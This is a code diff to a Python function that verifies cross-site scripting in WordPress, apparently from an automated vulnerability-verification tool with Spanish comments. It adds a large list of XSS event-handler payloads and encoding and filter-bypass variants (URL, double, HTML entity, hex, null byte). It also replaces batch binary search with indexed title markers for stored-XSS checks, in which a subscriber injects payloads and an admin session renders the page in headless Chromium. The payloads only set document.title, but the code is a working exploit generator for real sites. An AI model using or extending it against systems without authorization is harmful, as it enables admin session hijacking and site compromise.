@@ -6267,6 +6267,8 @@ def verify_wordpress_xss(
                     f"<video><source onerror=\"{js}\"></video>",
                     f"<audio src=x onerror=\"{js}\">",
                     f"<object data=x onerror=\"{js}\">",
+                    f"<link rel=stylesheet href=x onerror=\"{js}\">",
+                    f"<script src=x onerror=\"{js}\"></script>",
                 ],
                 "onload": [
                     f"<svg onload=\"{js}\">",
@@ -6274,38 +6276,121 @@ def verify_wordpress_xss(
                     f"\"><svg onload=\"{js}\">",
                     f"<iframe onload=\"{js}\" src=x>",
                     f"<img src=x onload=\"{js}\">",
+                    f"<link rel=stylesheet onload=\"{js}\" href=data:,>",
                 ],
                 "onmouseover": [
                     f"\" onmouseover=\"{js}\" x=\"",
                     f"' onmouseover='{js}' x='",
                     f"<a onmouseover=\"{js}\">x</a>",
                     f"\"><a onmouseover=\"{js}\">x</a>",
+                    f"<div onmouseover=\"{js}\">x</div>",
+                    f"\"><div onmouseover=\"{js}\">x</div>",
                 ],
                 "onfocus": [
                     f"\" autofocus onfocus=\"{js}\" x=\"",
                     f"' autofocus onfocus='{js}' x='",
                     f"<input autofocus onfocus=\"{js}\">",
                     f"\"><input autofocus onfocus=\"{js}\">",
+                    f"<textarea autofocus onfocus=\"{js}\">",
+                    f"<select autofocus onfocus=\"{js}\"><option>x</option></select>",
                 ],
                 "ontoggle": [
                     f"<details open ontoggle=\"{js}\">x</details>",
                     f"\"><details open ontoggle=\"{js}\">x</details>",
+                    f"</p><details open ontoggle=\"{js}\">x</details>",
                 ],
                 "onstart": [
                     f"<marquee onstart=\"{js}\">x</marquee>",
+                    f"\"><marquee onstart=\"{js}\">x</marquee>",
                 ],
                 "onclick": [
                     f"\" onclick=\"{js}\" x=\"",
                     f"<a href=# onclick=\"{js}\">x</a>",
                     f"\"><a href=# onclick=\"{js}\">x</a>",
+                    f"<button onclick=\"{js}\">x</button>",
+                    f"\"><button onclick=\"{js}\">x</button>",
                 ],
                 "onanimationend": [
                     f"<div style=\"animation:x 0s\" onanimationend=\"{js}\">x</div>",
                     f"\"><div style=\"animation:x 0s\" onanimationend=\"{js}\">x</div>",
                 ],
+                "onanimationstart": [
+                    f"<div style=\"animation:x 0s\" onanimationstart=\"{js}\">x</div>",
+                    f"\"><div style=\"animation:x 0s\" onanimationstart=\"{js}\">x</div>",
+                ],
                 "onpointerover": [
                     f"\" onpointerover=\"{js}\" x=\"",
                     f"<div onpointerover=\"{js}\">x</div>",
+                    f"\"><div onpointerover=\"{js}\">x</div>",
+                ],
+                "onpointerenter": [
+                    f"\" onpointerenter=\"{js}\" x=\"",
+                    f"<div onpointerenter=\"{js}\">x</div>",
+                ],
+                "oninput": [
+                    f"\" oninput=\"{js}\" x=\"",
+                    f"<input oninput=\"{js}\" value=x autofocus>",
+                    f"\"><input oninput=\"{js}\" value=x autofocus>",
+                ],
+                "onchange": [
+                    f"\" onchange=\"{js}\" x=\"",
+                    f"<input onchange=\"{js}\" value=x>",
+                ],
+                "ontransitionend": [
+                    f"<div style=\"transition:all 0s\" ontransitionend=\"{js}\">x</div>",
+                    f"\"><div style=\"transition:all 0s\" ontransitionend=\"{js}\">x</div>",
+                ],
+                "onscroll": [
+                    f"<div style=\"overflow:auto;height:1px\" onscroll=\"{js}\">xxx</div>",
+                    f"\"><div style=\"overflow:auto;height:1px\" onscroll=\"{js}\">xxx</div>",
+                ],
+                "onresize": [
+                    f"<img onresize=\"{js}\" src=x style=\"width:100%\">",
+                    f"\"><img onresize=\"{js}\" src=x style=\"width:100%\">",
+                ],
+                "onhashchange": [
+                    f"<a href=#x onhashchange=\"{js}\">x</a>",
+                ],
+                "ondblclick": [
+                    f"\" ondblclick=\"{js}\" x=\"",
+                    f"<a ondblclick=\"{js}\">x</a>",
+                ],
+                "oncontextmenu": [
+                    f"\" oncontextmenu=\"{js}\" x=\"",
+                    f"<div oncontextmenu=\"{js}\">x</div>",
+                ],
+                "onkeydown": [
+                    f"\" onkeydown=\"{js}\" x=\"",
+                    f"<input onkeydown=\"{js}\" autofocus>",
+                    f"\"><input onkeydown=\"{js}\" autofocus>",
+                ],
+                "onkeyup": [
+                    f"\" onkeyup=\"{js}\" x=\"",
+                    f"<input onkeyup=\"{js}\" autofocus>",
+                ],
+                "onbeforeinput": [
+                    f"\" onbeforeinput=\"{js}\" x=\"",
+                    f"<input onbeforeinput=\"{js}\" autofocus>",
+                ],
+                "onpaste": [
+                    f"\" onpaste=\"{js}\" x=\"",
+                    f"<input onpaste=\"{js}\">",
+                ],
+                "oncopy": [
+                    f"\" oncopy=\"{js}\" x=\"",
+                    f"<div oncopy=\"{js}\">x</div>",
+                ],
+                "oncut": [
+                    f"\" oncut=\"{js}\" x=\"",
+                    f"<input oncut=\"{js}\">",
+                ],
+                "onsubmit": [
+                    f"<form onsubmit=\"{js}\"><input type=submit></form>",
+                    f"\"><form onsubmit=\"{js}\"><input type=submit></form>",
+                ],
+                "oninvalid": [
+                    f"<form><input required oninvalid=\"{js}\" type=submit></form>",
+                    f"\"><form><input required oninvalid=\"{js}\" type=submit></form>",
                 ],
             }
             if _sevt and _sevt in _EVT_PAYLOADS:
@@ -6377,18 +6462,40 @@ def verify_wordpress_xss(
                             _synth_priority.append(p)
                     break
 
-            # 3. Si hay encoding_bypass, añadir versiones codificadas de los primeros payloads
+            # 3. Dedup interno de _synth_priority manteniendo orden
+            _seen_sp: set = set()
+            _synth_priority_dedup = []
+            for _p in _synth_priority:
+                if _p not in _seen_sp:
+                    _seen_sp.add(_p)
+                    _synth_priority_dedup.append(_p)
+            _synth_priority = _synth_priority_dedup
+
+            # 4. Variantes de encoding/bypass para todos los synth payloads (no solo los 8 primeros)
             if _synth_priority and _senc not in ("none", "", "unknown"):
                 import urllib.parse as _up
                 _encoded_extra = []
-                for p in _synth_priority[:8]:
+                for _p in _synth_priority:
                     if _senc in ("url_encode", "url-encode", "urlencode"):
-                        _encoded_extra.append(_up.quote(p))
+                        _ep = _up.quote(_p)
                     elif _senc in ("double_encode", "double-encode"):
-                        _encoded_extra.append(_up.quote(_up.quote(p)))
+                        _ep = _up.quote(_up.quote(_p))
                     elif _senc in ("html_entity", "html-entity", "html_encode"):
-                        _encoded_extra.append(p.replace("<", "&lt;").replace(">", "&gt;")
-                                               .replace("\"", "&quot;").replace("'", "&#x27;"))
+                        _ep = (_p.replace("&", "&amp;").replace("<", "&lt;")
+                                .replace(">", "&gt;").replace("\"", "&quot;")
+                                .replace("'", "&#x27;"))
+                    elif _senc in ("unicode", "unicode_escape"):
+                        _ep = "".join(f"\\u{ord(c):04x}" if ord(c) > 127 or c in "<>\"'" else c
+                                      for c in _p)
+                    elif _senc in ("hex", "hex_encode"):
+                        _ep = "".join(f"&#x{ord(c):x};" if c in "<>\"'/" else c for c in _p)
+                    elif _senc in ("null_byte", "null-byte"):
+                        _ep = _p.replace("<", "\x00<")
+                    else:
+                        _ep = _p
+                    if _ep != _p and _ep not in _seen_sp:
+                        _encoded_extra.append(_ep)
+                        _seen_sp.add(_ep)
                 _synth_priority = _encoded_extra + _synth_priority
 
             # Insertar synth_priority AL PRINCIPIO de attempts, eliminando duplicados
@@ -6467,92 +6574,83 @@ def verify_wordpress_xss(
         if stored_xss_view_path:
             step(f"modo stored-XSS (dos pasos): inyectando via subscriber -> admin carga "
                  f"'{stored_xss_view_path}'...")
-            # Estrategia batch + búsqueda binaria:
-            # En vez de hacer 1 render Chromium por payload (532 renders × ~2.5s = ~22min),
-            # inyectamos un lote completo via HTTP (rápido) y hacemos UN solo render para
-            # comprobar si alguno disparó. Si disparó, búsqueda binaria para encontrar el
-            # payload exacto. Coste: O(log N) renders ≈ 9 renders para 532 payloads vs 532.
+            # Estrategia de marcadores únicos por payload:
+            # Cada payload lleva su propio document.title='binoracle-xss-TOKEN-{i}'.
+            # Se inyectan TODOS vía HTTP (sin Chromium — rápido), luego UN SOLO render de
+            # Chromium. El title resultante identifica directamente el índice del payload
+            # ganador. Coste: 1 render independientemente de cuántos payloads haya.
+            # (La búsqueda binaria anterior estaba rota: el DB acumula todos los payloads
+            # de lotes previos, así que el render siempre veía el marcador aunque el subconjunto
+            # actual no lo contuviera — falso positivo permanente a partir del primer hit.)
             import base64 as _base64
+            import re as _re_xss
 
-            def _do_inject(pv: str) -> bool:
-                """Inyecta un único payload via HTTP. Devuelve True si no hubo error."""
-                _ep = _base64.b64encode(pv.encode()).decode() if payload_transform == "base64" else pv
+            _inject_headers = {}
+            if "/wp-json/" in endpoint:
+                _inject_headers = {"User-Agent": (
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                    "AppleWebKit/537.36 (KHTML, like Gecko) "
+                    "Chrome/120.0.0.0 Safari/537.36")}
+
+            # Construir payloads con marcador único: sustituir el js genérico por uno indexado
+            _indexed = []  # list of (original_payload, indexed_payload)
+            for _i, _pv in enumerate(attempts):
+                _unique_js = f"document.title='binoracle-xss-{token}-{_i}'"
+                _unique_pv = _pv.replace(js, _unique_js)
+                _indexed.append((_pv, _unique_pv))
+
+            step(f"arrancando Chromium headless (modo stored-XSS, {len(_indexed)} payloads, "
+                 f"estrategia marcador-unico → 1 render)...")
+
+            # PASO 1: inyectar todos los payloads vía HTTP (sin Chromium)
+            for _orig_pv, _idx_pv in _indexed:
+                _ep = (_base64.b64encode(_idx_pv.encode()).decode()
+                       if payload_transform == "base64" else _idx_pv)
                 _pi = dict(base_params)
                 _pi[xss_param] = _ep
-                _ih = {}
-                if "/wp-json/" in endpoint:
-                    _ih = {"User-Agent": (
-                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-                        "AppleWebKit/537.36 (KHTML, like Gecko) "
-                        "Chrome/120.0.0.0 Safari/537.36")}
                 try:
                     boot.sub_sess.request(
                         m, boot.base_url + endpoint, timeout=20,
                         data=_pi if m != "GET" else None,
                         params=_pi if m == "GET" else None,
-                        headers=_ih or None)
-                    return True
+                        headers=_inject_headers or None)
                 except Exception as _e:
-                    tried.append({"payload": pv, "paso1_error": str(_e)})
-                    return False
+                    tried.append({"payload": _orig_pv, "paso1_error": str(_e)})
 
-            _BATCH = 32  # payloads por lote — balance entre colisiones y nro renders
-            step(f"arrancando Chromium headless (modo stored-XSS, {len(attempts)} payloads, "
-                 f"estrategia batch={_BATCH}+binaria)...")
+            # PASO 2: UN SOLO render para ver qué payload disparó
             with _XssBrowserSession() as xb:
-
-                def _render_check() -> str:
-                    t, _ = xb.render(boot.base_url, stored_xss_view_path,
-                                     "GET", {}, admin_cookies,
-                                     wait_for_xss_title="binoracle-xss-")
-                    return t
-
-                # Fase 1: inyectar lotes y detectar en qué lote dispara
-                _winning_batch: list = []
-                for _bi in range(0, len(attempts), _BATCH):
-                    _batch = attempts[_bi: _bi + _BATCH]
-                    for pv in _batch:
-                        _do_inject(pv)
-                    _t = _render_check()
-                    if _t == marker:
-                        _winning_batch = _batch
-                        step(f"batch [{_bi}..{_bi+len(_batch)-1}] disparó XSS — "
-                             f"buscando payload exacto via búsqueda binaria...")
-                        break
-
-                # Fase 2: búsqueda binaria dentro del lote ganador
-                if _winning_batch:
-                    _lo, _hi = 0, len(_winning_batch)
-                    while _hi - _lo > 1:
-                        _mid = (_lo + _hi) // 2
-                        for pv in _winning_batch[_lo:_mid]:
-                            _do_inject(pv)
-                        _t = _render_check()
-                        if _t == marker:
-                            _hi = _mid
-                        else:
-                            _lo = _mid
-                    _winner = _winning_batch[_lo]
-                    found = True
-                    res.evidence["payload_ganador"] = _winner
-                    res.evidence["stored_xss_view_path"] = stored_xss_view_path
-                    step(f"VERIFICADO (stored XSS): el admin cargo '{stored_xss_view_path}' "
-                         f"y el navegador ejecuto el script inyectado -- document.title = "
-                         f"'{marker}'. Payload: {_winner[:100]}")
-                    tried.append({"payload": _winner, "title_tras_vista_admin": marker})
-                    _, png = xb.render(boot.base_url, stored_xss_view_path,
-                                       "GET", {}, admin_cookies, capture=True)
-                    if png:
-                        boot.shots.append({
-                            "caption_es": (f"Paso 5: Stored XSS confirmado -- el admin cargo "
-                                          f"'{stored_xss_view_path}' y el navegador REAL ejecuto "
-                                          f"el script inyectado en '{xss_param}', cambiando "
-                                          f"document.title al marcador '{marker}'."),
-                            "caption_en": (f"Step 5: Stored XSS confirmed -- admin loaded "
-                                          f"'{stored_xss_view_path}' and the REAL browser executed "
-                                          f"the script injected via '{xss_param}', changing "
-                                          f"document.title to marker '{marker}'."),
-                            "png_b64": png, "url": boot.base_url + stored_xss_view_path})
+                _title, _ = xb.render(boot.base_url, stored_xss_view_path,
+                                      "GET", {}, admin_cookies,
+                                      wait_for_xss_title=f"binoracle-xss-{token}-")
+                _m = _re_xss.match(
+                    rf"binoracle-xss-{_re_xss.escape(token)}-(\d+)$", _title or "")
+                if _m:
+                    _winner_idx = int(_m.group(1))
+                    _winner = attempts[_winner_idx] if _winner_idx < len(attempts) else ""
+                    if _winner:
+                        found = True
+                        res.evidence["payload_ganador"] = _winner
+                        res.evidence["stored_xss_view_path"] = stored_xss_view_path
+                        tried.append({"payload": _winner, "title_tras_vista_admin": _title,
+                                      "payload_index": _winner_idx})
+                        step(f"VERIFICADO (stored XSS): el admin cargo '{stored_xss_view_path}' "
+                             f"y el navegador ejecuto el script inyectado (payload #{_winner_idx}) "
+                             f"-- document.title = '{_title}'. Payload: {_winner[:100]}")
+                        _, png = xb.render(boot.base_url, stored_xss_view_path,
+                                           "GET", {}, admin_cookies, capture=True)
+                        if png:
+                            boot.shots.append({
+                                "caption_es": (
+                                    f"Paso 5: Stored XSS confirmado -- el admin cargo "
+                                    f"'{stored_xss_view_path}' y el navegador REAL ejecuto "
+                                    f"el script inyectado en '{xss_param}' (payload "
+                                    f"#{_winner_idx}), cambiando document.title al marcador."),
+                                "caption_en": (
+                                    f"Step 5: Stored XSS confirmed -- admin loaded "
+                                    f"'{stored_xss_view_path}' and the REAL browser executed "
+                                    f"the script injected via '{xss_param}' (payload "
+                                    f"#{_winner_idx}), changing document.title to marker."),
+                                "png_b64": png, "url": boot.base_url + stored_xss_view_path})
 
         # ── MODO 1: Reflected / same-response ───────────────────────────────────────────────
         if not found and not stored_xss_view_path:
